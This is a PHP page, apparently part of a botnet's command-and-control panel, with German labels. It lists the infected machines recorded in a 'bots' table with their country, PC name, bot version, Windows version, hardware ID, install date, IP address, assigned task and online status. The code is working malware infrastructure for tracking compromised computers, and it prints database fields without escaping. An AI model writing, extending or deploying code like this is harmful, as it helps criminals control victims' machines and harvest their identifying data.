<?php
	include('include/config.php');
	$query = panel_sql_request("SELECT * FROM ".$sql_table['bots']." ORDER BY ID;");
	echo "<table width=100%>";
	echo '<td class="td">|<img src="img/id.png"> ID</td>
	<td class="td">|<img src="img/herkunft.png"> HERKUNFT</td>
	<td class="td">|<img src="img/bot.png"> NAME</td>
	<td class="td">|<img src="img/version.png"> VERSION</td>
	<td class="td">|<img src="img/os.png"> OPERATING SYSTEM</td>
	<td class="td">|<img src="img/hwid.png"> HARDWARE ID</td>
	<td class="td">|<img src="img/install.png"> INSTALLIERT</td>
    <td class="td">|<img src="img/ip.png"> IP ADRESSE</td>
	<td class="td">|<img src="img/task.png"> TASK ID</td>
	<td class="td">|<img src="img/status.png"> STATUS</td>
	</tr>';
	
	echo "<tr><td>-
	     </td><td>-
		 </td><td>-
		 </td><td>-
		 </td><td>-
		 </td><td>-
		 </td><td>-
		 </td><td>-
		 </td><td>-
		 </td></tr>";

	while($row = $query->fetch_assoc()){
		
		if($row['ConTime'] > time()-$time_on ){
			$status = "ONLINE";
		} 
		else{
			$status = "<font color='#4D2222'>OFFLINE</font>";
		}
					  echo '<td class="td">|'.$row['ID'].'</td>
					        <td class="td">|<img src="img/flaggen/'.$row['Country'].'.gif" /> '.$row['CName'].'</td>
						    <td class="td">|'.$row['PCName'].'</td>
						    <td class="td">|'.$row['BotVersion'].'</td>
							<td class="td">|'.$row['WinVersion'].'</td>
							<td class="td">|'.$row['HWID'].'</td>
							<td class="td">|'.date("d.m.y",$row['InstTime']).'</td>
                            <td class="td">|'.$row['IP'].'</td>
							<td class="td">|'.$row['taskID'].'</td>
							<td class="td">|'.$status.'</td>
					  </tr>';							 
	}
	echo "</table>";
?>